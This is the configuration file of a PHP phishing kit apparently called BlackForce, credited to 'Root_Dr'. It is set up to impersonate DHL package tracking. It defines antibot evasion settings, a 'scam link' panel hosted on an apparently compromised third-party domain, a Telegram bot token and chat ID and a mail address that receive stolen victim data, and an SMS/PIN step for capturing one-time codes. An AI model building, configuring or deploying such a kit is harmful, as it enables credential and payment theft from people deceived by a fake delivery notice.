<?php
/*
██████╗ ██╗      █████╗  ██████╗██╗  ██╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██║     ██╔══██╗██╔════╝██║ ██╔╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██║     ███████║██║     █████╔╝ █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██║     ██╔══██║██║     ██╔═██╗ ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝███████╗██║  ██║╚██████╗██║  ██╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝   
Coded By Root_Dr
DM:@Root_Dr
*/
session_start();
error_reporting(0);

require "functions.php";

define("ANTIBOTPW_API", ''); // ANTIBOT.PW API

define("CAPTCHA", false); // CAPTCHA

define("FLAG", '🌍');
define("SCAM_NAME", 'GLOBAL DHL');
define("WEBSITE", 'https://www.dhl.com/');

define("TRACKN", '00390043431154980732');

// SCAM LINK FOR PANEL
define("PANEL", 'https://briliantskinnsentials.ph/dcrv');
// TELEGRAM BOT REZ CONFIG
define("TOKEN", '8038329723:AAG6ThxkD1xT9yc9AUVrGWs4NuywwEM5MyE');
define("CHATID", '6882323660');
// MAIL REZ CONFIG
define("BULLET", 'your@email.com');
// THE TIME BETWEEN SMS PAGE
define("TIMER", '20');

define("PIN", true);